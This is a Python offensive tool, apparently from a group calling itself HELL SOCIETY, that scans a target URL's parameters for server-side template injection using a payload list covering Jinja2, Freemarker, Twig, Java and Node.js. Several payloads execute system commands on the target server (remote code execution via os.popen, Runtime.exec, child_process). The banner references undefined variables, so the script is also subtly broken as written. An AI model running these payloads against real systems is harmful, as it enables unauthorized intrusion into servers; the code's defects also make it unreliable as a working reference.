#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  SSTI (SERVER-SIDE TEMPLATE INJECTION) SCANNER v2.0              ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Web Pentesting                            ║
╚══════════════════════════════════════════════════════════════════╝

ADVERTENCIA LEGAL: El uso de esta herramienta sin autorización
escrita del propietario del sistema objetivo es ILEGAL.
Los creadores NO se hacen responsables del mal uso de esta herramienta.
"""

import requests
import sys
import colorama
from colorama import Fore, Back, Style
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import argparse

colorama.init(autoreset=True)

BANNER = f"""⠉⠉⠉⠉⠁⠀⠀⠀⠀⠒⠂⠰⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⠀⠐⠒⠒⠀⠀⠈⠉⠉⠉⠉⢉⣉⣉⣉⣙⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡀⠤⠒⠒⠉⠁⠀⠀⠀⠀⠳⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠛⠛⠉⠛⠛⠶⢦⣤⡐⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⢳⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠳⠶⢶⣦⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠉⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄
  {Y}  Created by: HELL SOCIETY{RS}"""

DISCLAIMER = f"""
{Fore.RED}{Back.BLACK}
[!] ADVERTENCIA LEGAL [!]
Esta herramienta es para uso en pentesting AUTORIZADO únicamente.
Los creadores (HELL SOCIETY) NO se hacen responsables del mal uso.
"""

SSTI_PAYLOADS = [
    ('{{7*7}}', '49', 'Jinja2/Twig'),
    ('${7*7}', '49', 'Freemarker/Spring'),
    ('<%= 7*7 %>', '49', 'JSP/ERB'),
    ('#{7*7}', '49', 'Ruby ERB'),
    ('{{7*"7"}}', '7777777', 'Jinja2'),
    ('{{config}}', 'config', 'Jinja2 Flask'),
    ('{{self}}', 'self', 'Jinja2'),
    ('{{"".class}}', 'str', 'Jinja2 Python'),
    ('{{request}}', 'request', 'Jinja2 Flask'),
    ('{% import os %}{{os.popen("id").read()}}', 'uid=', 'Jinja2 RCE'),
    ('{{lipsum.__globals__.os.popen("id").read()}}', 'uid=', 'Jinja2 RCE'),
    ('${T(java.lang.Runtime).getRuntime().exec("id")}', 'uid=', 'Java SSTI'),
    ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', 'uid=', 'Freemarker RCE'),
    ('{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}', 'uid=', 'Twig RCE'),
    ('{{constructor.constructor("return process.mainModule.require(\'child_process\').execSync(\'id\')")()}}', 'uid=', 'Node.js SSTI'),
]

class SSTIScanner:
    def __init__(self, target, timeout=10):
        self.target = target
        self.timeout = timeout
        self.vulns = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) HellSociety/2.0'
        })

    def get_params(self):
        parsed = urlparse(self.target)
        return parse_qs(parsed.query)

    def modify_url(self, param, payload):
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                          parsed.params, new_query, parsed.fragment))

    def scan(self):
        params = self.get_params()
        if not params:
            print(f"{Fore.RED}  [!] No parameters found in URL")
            return

        total = len(params) * len(SSTI_PAYLOADS)
        current = 0

        print(f"{Fore.CYAN}  [*] Testing {len(params)} parameter(s) with {len(SSTI_PAYLOADS)} SSTI payloads")
        print(f"{Fore.CYAN}  [*] Total tests: {total}\n")

        for param in params:
            for payload, expected, engine in SSTI_PAYLOADS:
                current += 1
                progress = (current / total) * 100
                bar_length = 40
                filled = int(bar_length * current / total)
                bar = f"{Fore.GREEN}█{Style.RESET_ALL}" * filled + f"{Fore.RED}░{Style.RESET_ALL}" * (bar_length - filled)
                print(f"\r{Fore.CYAN}  [{bar}] {progress:.1f}% - {param}={payload[:30]} ({engine})", end="", flush=True)

                test_url = self.modify_url(param, payload)
                try:
                    resp = self.session.get(test_url, timeout=self.timeout)
                    content = resp.text

                    if expected in content:
                        result = {
                            'param': param,
                            'payload': payload,
                            'expected': expected,
                            'engine': engine,
                            'status': resp.status_code
                        }
                        self.vulns.append(result)
                        print(f"\n")
                        print(f"  {Fore.GREEN}[+] SSTI VULNERABLE!")
                        print(f"  {Fore.GREEN}  Parameter: {Fore.WHITE}{param}")
                        print(f"  {Fore.GREEN}  Engine: {Fore.YELLOW}{engine}")
                        print(f"  {Fore.GREEN}  Payload: {Fore.WHITE}{payload[:50]}")
                        print(f"  {Fore.GREEN}  Expected '{expected}' found in response")
                        print(f"  {Fore.CYAN}  {'─' * 60}")

                except requests.exceptions.RequestException:
                    pass

    def print_results(self):
        if not self.vulns:
            print(f"\n\n{Fore.YELLOW}  [!] No SSTI vulnerabilities found")
            return

        print(f"\n\n{Fore.RED}{Back.BLACK}  SCAN COMPLETE - {len(self.vulns)} VULNERABILITY(IES) FOUND  ")
        print(f"{Fore.CYAN}  {'═' * 60}")

        for i, v in enumerate(self.vulns, 1):
            print(f"\n  {Fore.CYAN}[{i}] {Fore.WHITE}Param: {v['param']}")
            print(f"      {Fore.YELLOW}Engine: {v['engine']}")
            print(f"      {Fore.GREEN}Payload: {v['payload'][:60]}")

def main():
    print(BANNER)
    print(DISCLAIMER)

    parser = argparse.ArgumentParser(description='Hell Society SSTI Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL with parameters')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout')
    args = parser.parse_args()

    scanner = SSTIScanner(args.url, args.timeout)
    print(f"{Fore.CYAN}  [*] Target: {Fore.WHITE}{args.url}")
    print(f"{Fore.CYAN}  [*] Starting SSTI scan...\n")

    scanner.scan()
    scanner.print_results()

if __name__ == "__main__":
    main()
